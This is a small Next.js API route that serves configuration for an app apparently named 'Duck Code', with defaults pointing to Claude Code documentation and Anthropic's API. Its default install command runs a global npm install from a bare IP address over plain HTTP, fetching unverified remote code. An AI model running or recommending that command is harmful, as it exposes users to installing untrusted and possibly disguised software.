export const dynamic = 'force-dynamic'

import { NextResponse } from 'next/server'

export async function GET() {
  return NextResponse.json({
    appName: process.env.APP_NAME || 'Duck Code',
    apiUrl: process.env.API_URL || 'http://localhost:9998', 
    installCommand: process.env.INSTALL_COMMAND || 'npm install -g http://111.180.197.234:7778/install --registry=https://registry.npmmirror.com',
    docsUrl: process.env.DOCS_URL || 'https://github.com/anthropics/claude-code',
    claudeUrl: process.env.CLAUDE_URL || 'https://api.anthropic.com'
  })
}